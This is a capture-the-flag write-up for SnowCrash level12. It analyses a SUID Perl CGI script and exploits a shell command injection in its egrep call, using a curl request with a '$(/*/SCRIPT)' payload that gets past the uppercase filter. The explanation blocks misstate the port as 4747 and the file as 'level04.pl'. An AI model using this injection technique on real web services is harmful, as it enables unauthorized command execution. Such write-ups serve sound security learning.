# LEVEL12

## 1. Inspect The Home Directory

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

A Perl CGI script `level12.pl` is present in the home directory.
The script is owned by `flag12`, and has the SUID bit set (`-rwsr-sr-x+`), meaning it executes with the privileges of the `flag12` user.
`perl` is a scripting language, often used for automation and for generating dynamic web content (for example, via CGI).
Interact with it by sending an HTTP request.

## 2. Analyze The Program

```bash
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

The script retrieve the request's contents, apply modification on it, and print `.` or `..` depending on the result. More precisely, it:
- Uses the CGI module to read two parameters from the request: `x` and `y` (e.g., `?x=...&y=...`).
- Passes these parameters into the function `t()`, where `$xx` corresponds to `x` and `$nn` corresponds to `y`.
- Modifies `$xx` by:
  - `$xx =~ tr/a-z/A-Z/;` - converting all lowercase letters to uppercase.
  - `$xx =~ s/\s.*//;` - removing everything after the first space.
- Execute the shell command `egrep "^$xx" /tmp/xd 2>&1` to search in `/tmp/xd` for lines starting with the value of `$xx`.
Because the command is executed with backticks `\``, and `$xx` comes directly from user input, this introduces a command injection vulnerability.
- Iterates over the output of the command and checks whether $nn matches part of it.
- Calls the function `n()` which prints `..` if a match is found, or `.` otherwise.

**Regex explanation:**
- `tr/a-z/A-Z/`		: translates every lowercase character (`a–z`) into its uppercase equivalent (`A–Z`).
	- `tr/A/B `			: replaces each occurrence of characters in set `A` with the corresponding character in set `B`.
	- `a-z`				: every ASCII character between `a` and `z`.
	- `A-Z`				: every ASCII character between `A` and `Z`.

- `s/\s.*//`		: regex substitution, only keeping the first "word".
	- `s/.../.../`		: substitution syntax in Perl regex.
	- `\s`				: matches the first whitespace.
	- `.*`				: matches everything after it.
	- `//`				: replaces the match with nothing (i.e., deletes it).

- `^$xx`			: ensures that the line begins with `$xx`.
	-	`^`				: matches the start of a line.s
	-	`$xx`			: the expanded variable value passed from user input.

**Explanation:**
- `egrep`			: extended `grep`, searches for a regex pattern in a file (supports extended regex, unlike basic `grep`).
- `"^$xx"`			: the regex to match, lines that start with the content of `$xx`.
- `/tmp/xd`			: the file in which the pattern is searched.
- `2>&1`			: redirects error messages (stderr, file descriptor 2) to standard ouput (stdout, file descriptor 1).

## 3. Exploit Shell Command Injection

By injecting a shell payload inside `x`, arbitrary commands can be executed with flag12’s privileges.

```bash
level12@SnowCrash:~$ cat << EOF > /tmp/SCRIPT
> #!/bin/bash
> getflag > /tmp/getflag
> EOF
level12@SnowCrash:~$ chmod +x /tmp/SCRIPT
level12@SnowCrash:~$ curl http://localhost:4646/level12.pl?x='$(/*/SCRIPT)'
..level12@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : XXX
```

The script `/tmp/SCRIPT` created execute `getflag` and redirect the output in `tmp/getflag`.

**Payload breakdown:**

- `$(...)` 				: command substitution syntax in shell. It executes the command inside the parentheses and replaces it with the output. 
- `/*/` 				: matches any directory in the root (`/`). The asterisk (`*`) is used because the program transforms all letters to uppercase, so the exact path may be altered.
- SCRIPT` 				: name of the script, uppercase is used because the program converts input to uppercase before execution, ensuring the script is found.

**Explanation:**
- `cat << EOF > file`		: creates a file and writes everything until `EOF` into it.

- `> FILE`					: redirects the standard output of a command into `FILE`

- `chmod +x file`			: makes the file executable.

- `curl`					: makes an HTTP request.
- `http://`					: protocol used.
- `localhost`	  			: destination host, here the request is made to the local machine.
- `4747`					: port number where the Perl CGI script is listening.
- `level04.pl`  			: script to execute *(can be omitted from the request)*.
- `?x`						: query parameter passed to the script, read by `CGI`.

## 4. Alternatives `curl`

There are multiple ways to call the vulnerable script:

```
level12@SnowCrash:~$ curl http://localhost:4646/level12.pl?x='$(/*/script)'
level12@SnowCrash:~$ curl localhost:4646/level12.pl?x='$(/*/script)'
level12@SnowCrash:~$ curl localhost:4646?x='$(/*/script)'
```

- The `script` file can be written in lowercase, because the program converts input to uppercase.
- The hostname `http://localhost:4646/level12.pl` can be shortened to `localhost:4646/level12.pl` since the curl defaults to `http`.
- The path `/level12.pl` can sometimes be omitted depending on the CGI server configuration. In this case, it works because it is the only file served on `localhost:4646`.

**Explanation:**
- `curl`					: makes an HTTP request.
- `http://`					: protocol used.
- `localhost`	  			: destination host, here the request is made to the local machine.
- `4747`					: port number where the Perl CGI script is listening.
- `level04.pl`  			: script to execute *(can be omitted from the request)*.
- `?x`						: query parameter passed to the script, read by `CGI`.